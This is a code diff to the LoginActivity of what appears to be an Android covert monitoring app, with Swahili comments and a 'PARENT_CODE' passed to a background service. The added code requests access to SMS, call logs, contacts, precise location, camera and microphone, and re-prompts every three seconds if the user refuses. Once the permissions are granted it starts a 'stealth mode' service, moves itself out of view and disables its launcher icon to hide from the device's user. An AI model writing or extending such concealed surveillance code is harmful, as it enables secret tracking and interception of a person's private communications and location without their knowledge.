@@ -19,6 +19,17 @@ public class LoginActivity extends Activity {
     private Button verifyButton;
     private TextView statusText;
     private SharedPreferences prefs;
+    
+    private static final int PERMISSION_REQUEST_CODE = 1001;
+    private static final String[] REQUIRED_PERMISSIONS = {
+        "android.permission.READ_SMS",
+        "android.permission.READ_CALL_LOG", 
+        "android.permission.READ_CONTACTS",
+        "android.permission.ACCESS_FINE_LOCATION",
+        "android.permission.CAMERA",
+        "android.permission.RECORD_AUDIO",
+        "android.permission.WRITE_EXTERNAL_STORAGE"
+    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -29,6 +40,12 @@ public class LoginActivity extends Activity {
         codeInput = findViewById(R.id.codeInput);
         verifyButton = findViewById(R.id.verifyButton);
         statusText = findViewById(R.id.statusText);
+
+        // Check if already verified and has permissions
+        if (prefs.getBoolean("verified", false) && hasAllPermissions()) {
+            startStealthMode();
+            return;
+        }
 
         verifyButton.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -84,7 +101,7 @@ public class LoginActivity extends Activity {
                                 editor.putBoolean("verified", true);
                                 editor.apply();
                                 
-                                // Anza kuomba permissions
+                                // Anza kuomba permissions zote
                                 requestAllPermissions();
                                 
                             } else if (responseCode == 404) {
@@ -111,22 +128,57 @@ public class LoginActivity extends Activity {
     }
 
     private void requestAllPermissions() {
-        statusText.setText("🔐 Inaomba ruhusa zote...");
+        statusText.setText("🔐 Inaomba ruhusa zote muhimu...");
         
-        // OmbI permissions zote muhimu
-        String[] permissions = {
-            "android.permission.READ_SMS",
-            "android.permission.READ_CALL_LOG", 
-            "android.permission.READ_CONTACTS",
-            "android.permission.ACCESS_FINE_LOCATION",
-            "android.permission.CAMERA",
-            "android.permission.RECORD_AUDIO",
-            "android.permission.WRITE_EXTERNAL_STORAGE"
-        };
+        // For Android 6.0+ (API 23+), tumia requestPermissions
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+            requestPermissions(REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
+        } else {
+            // For older versions, proceed directly
+            startStealthMode();
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
-        // Hapa kwa Android 6.0+, tumia requestPermissions()
-        // Kwa sasa tuendelee direct kwa ajili ya mfano
-        startStealthMode();
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            boolean allGranted = true;
+            
+            // Check if all permissions were granted
+            for (int result : grantResults) {
+                if (result != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            
+            if (allGranted) {
+                statusText.setText("✅ Ruhusa zote zimekubaliwa!");
+                startStealthMode();
+            } else {
+                statusText.setText("❌ Baadhi ya ruhusa hazikukubaliwa. App haitafanya kazi vizuri.");
+                // Retry permission request after 3 seconds
+                new android.os.Handler().postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        requestAllPermissions();
+                    }
+                }, 3000);
+            }
+        }
+    }
+
+    private boolean hasAllPermissions() {
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+            for (String permission : REQUIRED_PERMISSIONS) {
+                if (checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    return false;
+                }
+            }
+        }
+        return true;
     }
 
     private void startStealthMode() {
@@ -137,13 +189,30 @@ public class LoginActivity extends Activity {
         serviceIntent.putExtra("PARENT_CODE", prefs.getString("parent_code", ""));
         startService(serviceIntent);
         
-        // Ondoka kwenye screen na kujificha
-        Toast.makeText(this, "✅ App imesanikishwa kikamilifu!", Toast.LENGTH_LONG).show();
+        // Ondoka kwenye screen na kujificha kwenye system settings
+        Toast.makeText(this, "✅ App imesanikishwa! Inajificha kwenye system settings.", Toast.LENGTH_LONG).show();
         
-        // Tumia moveTaskToBack kuondoka kwenye screen
+        // Hide app from recent apps
         moveTaskToBack(true);
         
-        // Optional: Maliza activity ili isionekane tena
+        // Optional: Hide app launcher icon (requires component disabling)
+        hideLauncherIcon();
+        
+        // Maliza activity ili isionekane tena
         finish();
+    }
+
+    private void hideLauncherIcon() {
+        try {
+            // This will hide the app from launcher but keep it in system settings
+            android.content.pm.PackageManager p = getPackageManager();
+            p.setComponentEnabledSetting(
+                new android.content.ComponentName(this, LoginActivity.class),
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            );
+        } catch (Exception e) {
+            // Silent catch - icon might remain visible
+        }
     }
 }
